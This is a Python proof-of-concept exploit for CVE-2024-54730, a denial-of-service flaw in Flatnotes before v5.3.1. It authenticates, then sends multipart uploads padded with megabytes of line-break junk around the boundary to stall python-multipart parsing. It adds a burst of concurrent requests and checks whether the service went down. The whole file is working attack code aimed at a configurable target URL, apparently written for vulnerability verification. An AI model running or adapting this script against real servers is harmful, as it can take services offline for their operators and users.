#!/usr/bin/env python3
"""
CVE-2024-54730 - Flatnotes Image Upload Denial of Service
Affected: Flatnotes < v5.3.1
"""

import requests
import time
import sys
import concurrent.futures

TARGET_URL = "http://localhost:8090"
USERNAME = "admin"
PASSWORD = "admin123"


def get_token():
    resp = requests.post(
        f"{TARGET_URL}/api/token",
        json={"username": USERNAME, "password": PASSWORD},
        timeout=10
    )
    if resp.status_code != 200:
        print(f"[-] Failed to get token: {resp.text}")
        return None
    return resp.json()["access_token"]


def check_service_availability(timeout=5):
    try:
        resp = requests.get(f"{TARGET_URL}/health", timeout=timeout)
        return resp.status_code == 200
    except:
        return False


def create_malicious_multipart(junk_size_mb=10):
    """Create malicious multipart payload with junk data before boundary."""
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    junk_data = "\r\n" * (junk_size_mb * 1024 * 1024)
    
    body = junk_data
    body += f"--{boundary}\r\n"
    body += 'Content-Disposition: form-data; name="file"; filename="test.png"\r\n'
    body += "Content-Type: image/png\r\n\r\n"
    body += "PNG_DATA_HERE"
    body += f"\r\n--{boundary}--\r\n"
    body += junk_data
    
    return body.encode('utf-8'), boundary


def send_malicious_request(token, junk_size_mb=5):
    """Send malicious request to trigger DoS."""
    body, boundary = create_malicious_multipart(junk_size_mb)
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    }
    
    start_time = time.time()
    try:
        resp = requests.post(
            f"{TARGET_URL}/api/attachments",
            headers=headers,
            data=body,
            timeout=120
        )
        elapsed = time.time() - start_time
        return resp.status_code, elapsed
    except requests.exceptions.Timeout:
        elapsed = time.time() - start_time
        return None, elapsed
    except Exception as e:
        elapsed = time.time() - start_time
        return None, elapsed


def main():
    print("[*] CVE-2024-54730 - Flatnotes DoS via Image Upload")
    print(f"[*] Target: {TARGET_URL}")
    print("[*] Vulnerability: python-multipart boundary parsing DoS")
    print()
    
    if not check_service_availability():
        print("[-] Target service is not available")
        return False
    print("[+] Target service is available")
    
    token = get_token()
    if not token:
        print("[-] Failed to authenticate")
        return False
    print("[+] Successfully authenticated")
    
    print("\n[*] Measuring baseline response time...")
    baseline_start = time.time()
    check_service_availability(timeout=30)
    baseline_time = time.time() - baseline_start
    print(f"[*] Baseline response time: {baseline_time:.3f}s")
    
    print("\n[*] Sending malicious multipart request (5MB junk data)...")
    print("[*] This exploits boundary parsing that processes line breaks byte-by-byte")
    
    status, elapsed = send_malicious_request(token, junk_size_mb=5)
    print(f"[*] Request completed in {elapsed:.2f} seconds")
    
    if elapsed > 10:
        print(f"[+] SUCCESS: Request took {elapsed:.2f}s (much longer than baseline)")
        print("[+] Server was stalled processing malformed boundary data")
    
    print("\n[*] Sending concurrent malicious requests...")
    
    def attack():
        return send_malicious_request(token, junk_size_mb=3)
    
    concurrent_start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(attack) for _ in range(5)]
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            status, elapsed = future.result()
            print(f"    Request {i+1}: time={elapsed:.2f}s")
    
    concurrent_total = time.time() - concurrent_start
    print(f"[*] Concurrent attack total time: {concurrent_total:.2f}s")
    
    print("\n[*] Checking service availability during attack...")
    response_time_start = time.time()
    available = check_service_availability(timeout=30)
    response_time = time.time() - response_time_start
    
    if not available:
        print("[+] SUCCESS: Service became unavailable (DoS achieved)")
    elif response_time > baseline_time * 5:
        print(f"[+] SUCCESS: Service response degraded ({response_time:.2f}s vs baseline {baseline_time:.3f}s)")
    else:
        print(f"[*] Service responded in {response_time:.2f}s")
    
    print("\n[+] CVE-2024-54730 verified")
    print("[+] Flatnotes < v5.3.1 is vulnerable to DoS via malformed multipart requests")
    return True


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
